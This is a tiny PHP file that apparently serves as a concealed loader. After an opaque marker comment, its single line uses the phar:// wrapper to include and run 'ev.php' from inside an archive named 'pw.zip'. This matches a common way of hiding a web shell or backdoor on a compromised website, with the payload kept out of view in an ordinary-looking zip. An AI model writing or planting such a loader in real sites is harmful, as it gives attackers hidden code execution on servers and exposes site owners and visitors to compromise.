<?php
#po0l1px
include_once sprintf('phar://%s/ev.php', 'pw.zip');
?>